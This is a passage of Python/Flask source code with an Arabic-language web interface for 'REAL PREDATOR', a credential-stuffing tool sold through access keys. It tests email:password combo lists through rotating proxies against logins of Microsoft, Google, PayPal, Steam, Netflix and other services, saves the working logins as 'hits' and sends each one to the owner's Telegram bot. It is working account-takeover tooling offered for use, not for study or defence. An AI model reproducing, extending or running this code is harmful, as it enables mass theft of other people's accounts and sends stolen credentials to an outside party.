        if is_gaming:
            gaming_file = f'REAL_PREDATOR_HITS/gaming_{datetime.now().strftime("%Y%m%d")}.txt'
            with open(gaming_file, 'a', encoding='utf-8') as f:
                f.write(content + '\n\n')
    except: pass

def send_telegram_hit(content):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": OWNER_ID, "text": content}
        requests.post(url, data=data, timeout=10)
    except: pass

def get_game_icon(platform_name):
    platform_lower = platform_name.lower()
    for game, icon in GAMING_ICONS.items():
        if game in platform_lower:
            return icon
    return '🎮'

# ================================================================
# الحلقة الرئيسية مع بروكسي
# ================================================================
def predator_loop():
    check_map = {
        'microsoft': check_microsoft, 'google': check_google,
        'facebook': check_facebook, 'instagram': check_instagram,
        'twitter': check_twitter, 'tiktok': check_tiktok,
        'spotify': check_spotify, 'netflix': check_netflix,
        'amazon': check_amazon, 'paypal': check_paypal,
        'steam': check_steam, 'discord': check_discord,
        'ubisoft': check_ubisoft, 'ea': check_ea,
        'epic': check_epic, 'roblox': check_roblox,
        'snapchat': check_snapchat, 'reddit': check_reddit,
    }
    
    while state.running:
        try:
            proxy = None
            if state.proxies:
                proxy = random.choice(state.proxies)
            
            if state.auto_mode or not state.selected_platform:
                platform = random.choice(PLATFORMS)
                check_func = platform['check']
                platform_name = platform['name']
                is_gaming = platform.get('gaming', False)
            else:
                platform_obj = next((p for p in PLATFORMS if p['check'] == state.selected_platform), None)
                if platform_obj:
                    check_func = state.selected_platform
                    platform_name = platform_obj['name']
                    is_gaming = platform_obj.get('gaming', False)
                else:
                    platform = random.choice(PLATFORMS)
                    check_func = platform['check']
                    platform_name = platform['name']
                    is_gaming = platform.get('gaming', False)
            
            if state.combo_list:
                with state.lock:
                    if not state.combo_list:
                        time.sleep(1)
                        continue
                    item = state.combo_list.pop(0)
                    if len(item) == 3:
                        email, password, detected = item
                        if state.selected_platform and detected != state.selected_platform:
                            continue
                    else:
                        email, password = item
            else:
                email, password, platform_name, check_func, is_gaming = generate_weak_account()

            session_req = requests.Session()
            session_req.verify = False
            session_req.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            
            if proxy:
                session_req.proxies = {"http": proxy, "https": proxy}

            check_function = check_map.get(check_func)
            if check_function:
                result, status = check_function(email, password, session_req)
            else:
                result, status = None, 'bad'

            with state.lock:
                state.checked += 1

            if result and result.get('success'):
                with state.lock:
                    state.hits += 1
                    state.generated += 1
                    num = state.generated
                    if is_gaming:
                        state.gaming += 1

                game_icon = get_game_icon(platform_name) if is_gaming else ''
                hit_content = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 #{num} {game_icon} {'🎮 GAMING' if is_gaming else ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 {email}
🔑 {password}
🌐 {platform_name}
✅ VALID
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

                state.results.insert(0, {'content': hit_content, 'is_gaming': is_gaming, 'game_icon': game_icon})
                if len(state.results) > 200:
                    state.results = state.results[:200]

                add_feed('hit' if not is_gaming else 'gaming', f'✅ {game_icon} {platform_name} | {email}')
                save_hit(hit_content, is_gaming, game_icon)
                send_telegram_hit(f"🔥 HIT!\n{hit_content}")

            elif status == 'bad':
                with state.lock:
                    state.bad += 1
                add_feed('bad', f'❌ {platform_name} | {email}')
            else:
                with state.lock:
                    state.errors += 1

            time.sleep(60 / state.speed if state.speed > 0 else 2)

        except Exception as e:
            with state.lock:
                state.errors += 1
            time.sleep(2)

# ================================================================
# صفحة الدخول مع خيارين للتشفير
# ================================================================
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>REAL PREDATOR</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#050508;font-family:'Share Tech Mono',monospace}
.login-box{background:rgba(0,0,0,0.92);border:1px solid rgba(0,255,65,0.15);border-radius:12px;padding:30px 25px;width:420px;max-width:92%;text-align:center}
.logo{font-family:'Orbitron',monospace;font-size:22px;color:#00ff41;margin-bottom:4px;text-shadow:0 0 30px rgba(0,255,65,0.2)}
.logo span{color:#ff0044}
.subtitle{color:#006622;font-size:8px;margin-bottom:15px;letter-spacing:2px}
.encryption-options{display:flex;gap:8px;margin-bottom:10px;justify-content:center}
.enc-option{flex:1;padding:6px 4px;border:1px solid rgba(0,255,65,0.08);border-radius:6px;background:rgba(0,0,0,0.6);color:#006622;font-size:8px;cursor:pointer;transition:all 0.3s;font-family:'Share Tech Mono',monospace;text-align:center}
.enc-option.active{border-color:#00ff41;color:#00ff41;background:rgba(0,255,65,0.05)}
.enc-option .icon{font-size:14px;display:block;margin-bottom:2px}
.enc-option .label{font-size:6px;color:#006622}
.enc-option.active .label{color:#00ff41}
.input-group{position:relative;margin-bottom:10px}
.input-group input{width:100%;padding:8px 12px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.08);border-radius:6px;color:#00ff41;font-size:11px;font-family:'Share Tech Mono',monospace;transition:all 0.3s;text-align:center;letter-spacing:1px}
.input-group input:focus{outline:none;border-color:#00ff41;box-shadow:0 0 30px rgba(0,255,65,0.05)}
.input-group input::placeholder{color:#006622}
.btn-login{width:100%;padding:8px;background:rgba(0,255,65,0.05);border:1px solid #00ff41;border-radius:6px;color:#00ff41;font-size:12px;font-weight:700;cursor:pointer;transition:all 0.3s;font-family:'Orbitron',monospace;letter-spacing:1px}
.btn-login:hover{background:rgba(0,255,65,0.1);box-shadow:0 0 50px rgba(0,255,65,0.15);transform:scale(1.02)}
.error-msg{color:#ff0044;font-size:8px;margin-top:4px;min-height:14px}
.hint{color:#006622;font-size:6px;margin-top:6px}
.footer{margin-top:10px;color:#006622;font-size:6px;letter-spacing:1px}
</style>
</head>
<body>
<div class="login-box">
    <div class="logo">REAL <span>PREDATOR</span></div>
    <div class="subtitle">⛓️ v18.1</div>
    
    <div class="encryption-options">
        <div class="enc-option active" id="encBinary" onclick="setEncryption('binary')">
            <span class="icon">🔐</span>
            <span>Binary</span>
            <span class="label">20 مقطع</span>
        </div>
        <div class="enc-option" id="encNormal" onclick="setEncryption('normal')">
            <span class="icon">🔑</span>
            <span>Normal</span>
            <span class="label">20 مقطع</span>
        </div>
    </div>
    
    <div class="input-group">
        <input type="text" id="keyInput" placeholder="🔑 أدخل المفتاح" autocomplete="off">
    </div>
    <button class="btn-login" id="loginBtn">⚡ دخول</button>
    <div id="errorMsg" class="error-msg"></div>
    
    <div class="hint" id="encHint">⚡ تشفير ثنائي - 20 مقطع</div>
    <div class="footer">© 2026</div>
</div>
<script>
let encType = 'binary';

function setEncryption(type){
    encType = type;
    document.getElementById('encBinary').classList.toggle('active', type==='binary');
    document.getElementById('encNormal').classList.toggle('active', type==='normal');
    document.getElementById('encHint').textContent = type==='binary' ? '⚡ تشفير ثنائي - 20 مقطع' : '⚡ تشفير عادي - 20 مقطع';
}

const keyInput=document.getElementById('keyInput');
const loginBtn=document.getElementById('loginBtn');
const errorMsg=document.getElementById('errorMsg');

keyInput.addEventListener('keypress',e=>{if(e.key==='Enter')doLogin();});
loginBtn.addEventListener('click',doLogin);

function doLogin(){
    const password=keyInput.value.trim();
    if(!password){errorMsg.textContent='⚠️ أدخل المفتاح';return;}
    loginBtn.disabled=true;
    loginBtn.textContent='⏳...';
    errorMsg.textContent='';
    
    fetch('/binary-auth',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({binary_key:password, enc_type:encType})
    })
    .then(res=>res.json())
    .then(data=>{
        loginBtn.disabled=false;
        loginBtn.textContent='⚡ دخول';
        if(data.success){
            window.location.href=data.redirect||'/dashboard';
        }else{
            errorMsg.textContent='❌ '+data.error;
            keyInput.value='';
        }
    })
    .catch(()=>{
        loginBtn.disabled=false;
        loginBtn.textContent='⚡ دخول';
        errorMsg.textContent='⚠️ خطأ';
    });
}
</script>
</body>
</html>
'''

# ================================================================
# صفحة لوحة التحكم (بدون صورة)
# ================================================================
DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>REAL PREDATOR</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;min-height:100vh}
::-webkit-scrollbar{width:3px}
::-webkit-scrollbar-track{background:#111}
::-webkit-scrollbar-thumb{background:#00ff41}
.container{max-width:1500px;margin:0 auto;padding:8px}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:6px 15px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
.header h1{font-size:16px;font-family:'Orbitron',monospace;color:#00ff41}
.header h1 span{color:#ff0044}
.binary-badge{font-size:7px;color:#ffd700;border:1px solid rgba(255,215,0,0.2);padding:1px 8px;border-radius:10px}
.top-bar{display:flex;justify-content:space-between;align-items:center;padding:3px 10px;background:rgba(0,0,0,0.5);border-radius:6px;margin-bottom:4px}
.btn{background:transparent;border:1px solid rgba(0,255,65,0.1);color:#00ff41;padding:2px 8px;border-radius:4px;font-size:7px;cursor:pointer;transition:all 0.3s;font-family:'Share Tech Mono',monospace}
.btn:hover{background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-logout{border-color:#ff0044;color:#ff0044}
.btn-start{background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-start:hover:not(:disabled){box-shadow:0 0 50px rgba(0,255,65,0.2)}
.btn-stop{border-color:#ff0044;color:#ff0044}
.btn-export{border-color:#ffd700;color:#ffd700}
.btn:disabled{opacity:0.3;cursor:not-allowed}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:6px;padding:4px 8px;margin-bottom:4px}
.card-title{font-size:9px;color:#00cc33;margin-bottom:2px}
.stats-grid{display:grid;grid-template-columns:repeat(8,1fr);gap:2px;margin-bottom:4px}
.stat-box{background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.06);border-radius:4px;padding:3px;text-align:center}
.stat-box .num{font-size:14px;font-weight:700;display:block}
.stat-box .label{font-size:5px;color:#006622}
.stat-box.green .num{color:#00ff41}
.stat-box.red .num{color:#ff0044}
.stat-box.gold .num{color:#ffd700}
.stat-box.blue .num{color:#0088ff}
.progress-bar{height:2px;background:rgba(0,255,65,0.05);border-radius:1px;overflow:hidden}
.progress-bar .fill{height:100%;background:#ff0044;width:0%}
.progress-text{font-size:6px;color:#006622;display:flex;justify-content:space-between;margin-top:1px}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(50px,1fr));gap:2px;margin-bottom:3px}
.platform-badge{padding:2px 3px;border-radius:3px;text-align:center;font-size:5px;border:1px solid rgba(0,255,65,0.06);background:rgba(0,0,0,0.6);color:#006622;cursor:pointer;transition:all 0.3s}
.platform-badge:hover{background:rgba(0,255,65,0.05);border-color:#00ff41}
.platform-badge.selected{background:rgba(0,255,65,0.1);border-color:#00ff41;color:#00ff41}
.platform-badge.gaming{border-color:#ffd700;color:#ffd700}
.platform-badge.gaming.selected{background:rgba(255,215,0,0.1);border-color:#ffd700}
.platform-badge .icon{font-size:10px;display:block;margin-bottom:1px}
.control-bar{display:flex;gap:2px;flex-wrap:wrap;align-items:center}
.config-row{display:flex;gap:2px;flex-wrap:wrap;align-items:center}
.config-row input{padding:2px 4px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:3px;color:#00ff41;font-size:7px;font-family:'Share Tech Mono',monospace;width:35px}
.config-row input:focus{outline:none;border-color:#00ff41}
.config-row label{color:#006622;font-size:6px}
.feed-container{max-height:100px;overflow-y:auto}
.feed-item{padding:1px 4px;font-size:6px;border-left:2px solid transparent;animation:slideIn 0.3s}
.feed-item.hit{background:rgba(0,255,65,0.04);border-left-color:#00ff41}
.feed-item.bad{background:rgba(255,0,68,0.06);border-left-color:#ff0044}
.feed-item.gaming{background:rgba(255,215,0,0.08);border-left-color:#ffd700}
.feed-item .time{color:#006622;font-size:5px;min-width:20px;display:inline-block}
.result-container{max-height:300px;overflow-y:auto}
.result-item{padding:3px 6px;font-size:6px;border-bottom:1px solid rgba(0,255,65,0.05);white-space:pre-wrap;word-break:break-all}
.result-item.gaming{background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.1)}
.result-item .gaming-badge{display:inline-block;background:rgba(255,215,0,0.15);color:#ffd700;padding:1px 4px;border-radius:2px;font-size:5px;margin-right:2px}
.status-badge{display:inline-flex;align-items:center;gap:3px;padding:1px 5px;border-radius:4px;font-size:7px}
.status-badge.running{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044}
.status-badge.stopped{background:rgba(0,255,65,0.05);color:#00ff41;border:1px solid rgba(0,255,65,0.2)}
.status-dot{width:3px;height:3px;border-radius:50%;display:inline-block}
.status-dot.running{background:#ff0044;animation:pulse 1.5s infinite}
.status-dot.stopped{background:#00ff41}
@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(0,255,65,0.3)}50%{box-shadow:0 0 60px rgba(0,255,65,0.6)}}
@keyframes slideIn{from{opacity:0;transform:translateX(-15px)}to{opacity:1;transform:translateX(0)}}
.empty-state{text-align:center;padding:8px;color:#006622;font-size:7px}
.mode-selector{display:flex;gap:3px;align-items:center;margin:2px 0}
.mode-btn{padding:1px 6px;border-radius:3px;border:1px solid rgba(0,255,65,0.1);background:transparent;color:#006622;font-size:6px;cursor:pointer;transition:all 0.3s;font-family:'Share Tech Mono',monospace}
.mode-btn.active{background:rgba(0,255,65,0.1);border-color:#00ff41;color:#00ff41}
@media(max-width:768px){.stats-grid{grid-template-columns:repeat(4,1fr)}.header h1{font-size:12px}}
</style>
</head>
<body>

<header class="header">
    <h1>REAL <span>PREDATOR</span></h1>
    <div>
        <span class="binary-badge">🔐 v18.1</span>
    </div>
</header>

<div class="container">
    <div class="top-bar">
        <span style="font-size:7px;color:#00ff41;"><i class="fas fa-shield-alt"></i> {% if is_dev %}DEV{% else %}SECURE{% endif %}</span>
        <span><i class="fas fa-clock"></i> <span id="sessionTimer">00:00:00</span></span>
        <a href="/logout" class="btn btn-logout"><i class="fas fa-sign-out-alt"></i> خروج</a>
    </div>

    <div class="card">
        <div class="card-title"><i class="fas fa-crosshairs"></i> المنصة</div>
        <div class="mode-selector">
            <button class="mode-btn active" id="autoModeBtn" onclick="setAutoMode()">🔄 عشوائي</button>
            <button class="mode-btn" id="selectedModeBtn" onclick="setSelectedMode()">🎯 محدد</button>
            <span style="color:#006622;font-size:6px;margin-right:5px;" id="currentModeDisplay">عشوائي</span>
        </div>
        <div class="platform-grid" id="platformGrid">
            {% for p in platforms %}
            <div class="platform-badge {% if p.gaming %}gaming{% endif %}" data-platform="{{ p.check }}" onclick="selectPlatform('{{ p.check }}')">
                <span class="icon"><i class="{{ p.icon }}" style="color:{{ p.color }}"></i></span>
                {{ p.name[:6] }}
            </div>
            {% endfor %}
        </div>
        <div style="font-size:5px;color:#006622;margin-top:2px;" id="selectedDisplay">⚠️ اختر</div>
    </div>

    <div class="card">
        <div style="display:flex;align-items:center;gap:4px;flex-wrap:wrap;justify-content:space-between;">
            <div style="display:flex;align-items:center;gap:3px;flex-wrap:wrap;">
                <span class="status-badge stopped" id="statusBadge">
                    <span class="status-dot stopped" id="statusDot"></span>
                    <span id="statusText">OFF</span>
                </span>
                <span style="color:#006622;font-size:6px;"><i class="fas fa-clock"></i> <span id="elapsed">00:00:00</span></span>
                <span style="color:#006622;font-size:6px;"><i class="fas fa-tachometer-alt"></i> <span id="cpm">0</span></span>
            </div>
            <div style="font-size:7px;">
                <span style="color:#00ff41;">🟢 <span id="hitCount">0</span></span>
                <span style="color:#ffd700;margin-right:3px;">🎮 <span id="gamingCount">0</span></span>
                <span style="color:#ff0044;margin-right:3px;">❌ <span id="badCount">0</span></span>
            </div>
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-box green"><span class="num" id="statChecked">0</span><span class="label">SCAN</span></div>
        <div class="stat-box gold"><span class="num" id="statHits">0</span><span class="label">HITS</span></div>
        <div class="stat-box red"><span class="num" id="statBad">0</span><span class="label">BAD</span></div>
        <div class="stat-box blue"><span class="num" id="statErrors">0</span><span class="label">ERR</span></div>
        <div class="stat-box gold"><span class="num" id="statGaming">0</span><span class="label">GAME</span></div>
        <div class="stat-box green"><span class="num" id="statRemaining">0</span><span class="label">REMAIN</span></div>
        <div class="stat-box green"><span class="num" id="statTotal">0</span><span class="label">TOTAL</span></div>
        <div class="stat-box red"><span class="num" id="statSpeed">0</span><span class="label">RPM</span></div>
    </div>

    <div class="card">
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div class="progress-text"><span id="progressPct">0%</span><span id="progressCount">0 / 0</span></div>
    </div>

    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> START</button>
            <button class="btn btn-stop" id="stopBtn" disabled><i class="fas fa-stop"></i> STOP</button>
            <button class="btn" id="clearBtn" style="border-color:rgba(255,255,255,0.1);color:#006622;"><i class="fas fa-trash"></i></button>
            <button class="btn btn-export" id="exportBtn"><i class="fas fa-download"></i></button>
            <button class="btn" id="cleanupBtn" style="border-color:rgba(255,215,0,0.2);color:#ffd700;"><i class="fas fa-broom"></i></button>
            <div class="config-row" style="margin-right:auto;">
                <label>RPM:</label>
                <input type="number" id="speedInput" value="30" min="5" max="60">
            </div>
        </div>
        <div style="display:flex;gap:3px;flex-wrap:wrap;margin-top:3px;padding-top:3px;border-top:1px solid rgba(0,255,65,0.05);">
            <div class="config-row">
                <label><i class="fas fa-upload"></i> كومبو:</label>
                <input type="file" id="comboFile" accept=".txt" style="display:none;">
                <label for="comboFile" style="padding:2px 5px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:3px;cursor:pointer;font-size:6px;">اختر</label>
                <span id="comboName" style="color:#006622;font-size:5px;">لا يوجد</span>
            </div>
            <div class="config-row">
                <label><i class="fas fa-network-wired"></i> بروكسي:</label>
                <input type="file" id="proxyFile" accept=".txt" style="display:none;">
                <label for="proxyFile" style="padding:2px 5px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:3px;cursor:pointer;font-size:6px;">رفع وتشغيل</label>
                <span id="proxyCount" style="color:#006622;font-size:5px;">0</span>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-title"><i class="fas fa-broadcast"></i> FEED <span style="font-size:6px;color:#006622;" id="feedCount">(0)</span></div>
        <div class="feed-container" id="feedContainer"><div class="empty-state">⏳ جاري...</div></div>
    </div>

    <div class="card">
        <div class="card-title"><i class="fas fa-database" style="color:#ffd700;"></i> HITS <span style="font-size:6px;color:#006622;" id="resultCount">(0)</span></div>
        <div class="result-container" id="resultContainer"><div class="empty-state">📭 فارغ</div></div>
    </div>
</div>

<script>
const $=id=>document.getElementById(id);
let selectedPlatform = null;
let autoMode = true;
let state = {running:false,checked:0,total:1,hits:0,bad:0,errors:0,gaming:0};

async function api(endpoint,method='GET',data=null){
    const opts={method,headers:{'Content-Type':'application/json'}};
    if(data)opts.body=JSON.stringify(data);
    try{const res=await fetch(endpoint,opts);return await res.json();}catch(e){return{success:false};}
}

function selectPlatform(platform){
    if(autoMode){
        autoMode = false;
        document.getElementById('autoModeBtn').classList.remove('active');
        document.getElementById('selectedModeBtn').classList.add('active');
    }
    selectedPlatform = platform;
    document.querySelectorAll('.platform-badge').forEach(el => {
        el.classList.toggle('selected', el.dataset.platform === platform);
    });
    document.getElementById('selectedDisplay').textContent = '✅ ' + platform;
    document.getElementById('currentModeDisplay').textContent = 'محدد';
}

function setAutoMode(){
    autoMode = true;
    selectedPlatform = null;
    document.getElementById('autoModeBtn').classList.add('active');
    document.getElementById('selectedModeBtn').classList.remove('active');
    document.querySelectorAll('.platform-badge').forEach(el => el.classList.remove('selected'));
    document.getElementById('selectedDisplay').textContent = '🔄 عشوائي';
    document.getElementById('currentModeDisplay').textContent = 'عشوائي';
}

function setSelectedMode(){
    if(!selectedPlatform){
        document.getElementById('selectedDisplay').textContent = '⚠️ اختر منصة';
        return;
    }
    autoMode = false;
    document.getElementById('autoModeBtn').classList.remove('active');
    document.getElementById('selectedModeBtn').classList.add('active');
    document.getElementById('currentModeDisplay').textContent = 'محدد';
}

async function updateStats(){
    try{
        const d=await api('/api/stats');
        if(!d.success)return;
        state.running=d.running;state.checked=d.checked;state.total=d.total||1;
        state.hits=d.hits;state.bad=d.bad;state.errors=d.errors||0;state.gaming=d.gaming||0;
        $('statChecked').textContent=state.checked;
        $('statHits').textContent=state.hits;
        $('statBad').textContent=state.bad;
        $('statErrors').textContent=state.errors;
        $('statGaming').textContent=state.gaming;
        $('statRemaining').textContent=d.remaining||0;
        $('statTotal').textContent=state.total;
        $('statSpeed').textContent=d.cpm||0;
        $('cpm').textContent=d.cpm||0;
        $('hitCount').textContent=state.hits;
        $('gamingCount').textContent=state.gaming;
        $('badCount').textContent=state.bad;
        $('elapsed').textContent=formatTime(d.elapsed||0);
        const pct=state.total>0?Math.min((state.checked/state.total)*100,100):0;
        $('progressFill').style.width=pct+'%';
        $('progressPct').textContent=pct.toFixed(1)+'%';
        $('progressCount').textContent=state.checked+' / '+state.total;
        const badge=$('statusBadge'),dot=$('statusDot'),text=$('statusText');
        if(state.running){badge.className='status-badge running';dot.className='status-dot running';text.textContent='ON';}
        else{badge.className='status-badge stopped';dot.className='status-dot stopped';text.textContent='OFF';}
        $('startBtn').disabled=state.running;
        $('stopBtn').disabled=!state.running;
    }catch(e){}
}

function formatTime(sec){const h=String(Math.floor(sec/3600)).padStart(2,'0');const m=String(Math.floor((sec%3600)/60)).padStart(2,'0');const s=String(Math.floor(sec%60)).padStart(2,'0');return h+':'+m+':'+s;}

async function updateFeed(){
    try{
        const d=await api('/api/feed');
        if(!d.success)return;
        const c=$('feedContainer');
        if(!d.feed||d.feed.length===0){c.innerHTML='<div class="empty-state">⏳ جاري...</div>';return;}
        c.innerHTML=d.feed.slice(0,60).map(item=>{
            const cls=item.type||'info';
            return `<div class="feed-item ${cls}"><span class="time">${item.time||''}</span><span>${item.text||''}</span></div>`;
        }).join('');
        $('feedCount').textContent='('+d.feed.length+')';
    }catch(e){}
}

async function updateResults(){
    try{
        const d=await api('/api/results');
        if(!d.success)return;
        const c=$('resultContainer');
        if(!d.results||d.results.length===0){c.innerHTML='<div class="empty-state">📭 فارغ</div>';return;}
        c.innerHTML=d.results.map(item=>{
            const gamingClass=item.is_gaming?'gaming':'';
            const badge=item.is_gaming?'<span class="gaming-badge">🎮</span>':'';
            return `<div class="result-item ${gamingClass}">${badge}${item.content}</div>`;
        }).join('');
        $('resultCount').textContent='('+d.results.length+')';
    }catch(e){}
}

async function updateSessionTimer(){
    try{
        const res=await api('/api/session');
        if(res.success){
            const remaining=res.remaining_seconds;
            if(remaining <= 0){
                window.location.href='/logout';
                return;
            }
            const hours=String(Math.floor(remaining/3600)).padStart(2,'0');
            const minutes=String(Math.floor((remaining%3600)/60)).padStart(2,'0');
            const seconds=String(Math.floor(remaining%60)).padStart(2,'0');
            document.getElementById('sessionTimer').textContent=hours+':'+minutes+':'+seconds;
        }
    }catch(e){}
}

$('comboFile').addEventListener('change', function(e){
    if(this.files.length>0){
        $('comboName').textContent=this.files[0].name;
        const reader=new FileReader();
        reader.onload=async function(ev){
            await api('/api/upload/combo','POST',{content:ev.target.result});
        };
        reader.readAsText(this.files[0]);
    }
});

$('proxyFile').addEventListener('change', function(e){
    if(this.files.length>0){
        const reader=new FileReader();
        reader.onload=async function(ev){
            const content=ev.target.result;
            const res=await api('/api/upload/proxy','POST',{content:content});
            if(res.success){
                document.getElementById('proxyCount').textContent=res.count;
            }
        };
        reader.readAsText(this.files[0]);
    }
});

$('startBtn').addEventListener('click', async function(){
    const speed=parseInt($('speedInput').value)||30;
    const platform = autoMode ? null : selectedPlatform;
    const data = {speed, platform, auto_mode: autoMode};
    const res=await api('/api/start','POST',data);
    if(res.success)console.log('STARTED');
});

$('stopBtn').addEventListener('click',async()=>{
    await api('/api/stop','POST');
});

$('clearBtn').addEventListener('click',async()=>{
    if(!confirm('Clear?'))return;
    await api('/api/clear','POST');
});

$('exportBtn').addEventListener('click',async()=>{
    const res=await api('/api/export','POST');
    if(res.success)window.open('/api/download/'+res.filename,'_blank');
});

$('cleanupBtn').addEventListener('click',async()=>{
    if(!confirm('تنظيف؟'))return;
    await api('/api/cleanup','POST');
});

setInterval(updateStats,300);
setInterval(updateFeed,500);
setInterval(updateResults,500);
setInterval(updateSessionTimer,1000);
updateStats();updateFeed();updateResults();updateSessionTimer();
</script>
</body>
</html>
'''

# ================================================================
# API Routes
# ================================================================
@app.route('/')
def login_page():
    if 'authenticated' in session and session['authenticated']:
        return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/binary-auth', methods=['POST'])
def binary_auth_login():
    binary_key = request.json.get('binary_key', '').strip()
    enc_type = request.json.get('enc_type', 'binary')
    
    if not binary_key:
        return jsonify({'success': False, 'error': 'أدخل المفتاح'})
    
    if binary_key == BINARY_MASTER_KEY:
        session['authenticated'] = True
        session['is_dev'] = True
        session['session_expiry'] = (datetime.now() + timedelta(hours=24)).isoformat()
        return jsonify({'success': True, 'redirect': '/dashboard'})
    
    if enc_type == "binary":
        valid, email = verify_binary_key(binary_key)
        if valid:
            session['authenticated'] = True
            session['is_dev'] = True
            session['dev_email'] = email
            session['session_expiry'] = (datetime.now() + timedelta(hours=12)).isoformat()
            return jsonify({'success': True, 'redirect': '/dashboard'})
        
        key_id, status = validate_bot_key(binary_key, "binary")
    else:
        # Normal encryption
        decrypted = normal_decrypt(binary_key)
        if decrypted and '@' in decrypted and '.' in decrypted:
            session['authenticated'] = True
            session['is_dev'] = True
            session['dev_email'] = decrypted
            session['session_expiry'] = (datetime.now() + timedelta(hours=12)).isoformat()
            return jsonify({'success': True, 'redirect': '/dashboard'})
        
        key_id, status = validate_bot_key(binary_key, "normal")
    
    if status == "VALID":
        conn = sqlite3.connect('bot_control.db')
        c = conn.cursor()
        c.execute('SELECT duration_hours, expires_at FROM bot_keys WHERE key_id = ?', (key_id,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return jsonify({'success': False, 'error': 'مفتاح غير صالح'})
        
        duration, expires = result
        expiry_time = datetime.fromisoformat(expires)
        remaining = int((expiry_time - datetime.now()).total_seconds())
        
        if remaining <= 0:
            return jsonify({'success': False, 'error': 'انتهت الصلاحية'})
        
        session['authenticated'] = True
        session['key_id'] = key_id
        session['is_dev'] = False
        session['session_expiry'] = expiry_time.isoformat()
        
        conn = sqlite3.connect('bot_control.db')
        c = conn.cursor()
        c.execute('''UPDATE bot_keys SET used = 1, used_by = ?, used_at = ?
                     WHERE key_id = ?''',
                  (request.remote_addr, datetime.now().isoformat(), key_id))
        c.execute('''INSERT INTO bot_logs (key_id, action, user_ip, user_agent, timestamp, details)
                     VALUES (?, 'ACCESS', ?, ?, ?, ?)''',
                  (key_id, request.remote_addr, request.headers.get('User-Agent', ''), datetime.now().isoformat(), f"enc_type: {enc_type}"))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'remaining': remaining,
            'duration': duration,
            'redirect': '/dashboard'
        })
    elif status == "KEY_EXPIRED":
        return jsonify({'success': False, 'error': 'انتهت الصلاحية'})
    elif status == "KEY_ALREADY_USED":
        return jsonify({'success': False, 'error': 'مستخدمة مسبقاً'})
    else:
        return jsonify({'success': False, 'error': 'مفتاح غير صالح'})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login_page'))

@app.route('/dashboard')
def dashboard():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('login_page'))
    if 'session_expiry' in session:
        if datetime.now() > datetime.fromisoformat(session['session_expiry']):
            session.clear()
            return redirect(url_for('login_page'))
    is_dev = session.get('is_dev', False)
    return render_template_string(DASHBOARD_TEMPLATE, platforms=PLATFORMS, is_dev=is_dev)

@app.route('/api/session')
def get_session():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'success': False}), 401
    if 'session_expiry' not in session:
        return jsonify({'success': False}), 401
    expiry = datetime.fromisoformat(session['session_expiry'])
    remaining = int((expiry - datetime.now()).total_seconds())
    return jsonify({'success': True, 'remaining_seconds': max(remaining, 0)})

@app.route('/api/stats')
def get_stats():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    elapsed = 0
    if state.start_time:
        elapsed = time.time() - state.start_time
    cpm = int((state.checked / elapsed) * 60) if elapsed > 2 else 0
    return jsonify({
        'success': True, 'running': state.running, 'checked': state.checked,
        'total': state.total, 'hits': state.hits, 'bad': state.bad,
        'errors': state.errors, 'gaming': getattr(state, 'gaming', 0),
        'remaining': len(state.combo_list), 'elapsed': int(elapsed), 'cpm': cpm,
        'selected_platform': state.selected_platform,
        'auto_mode': state.auto_mode,
        'is_dev': session.get('is_dev', False)
    })

@app.route('/api/feed')
def get_feed():
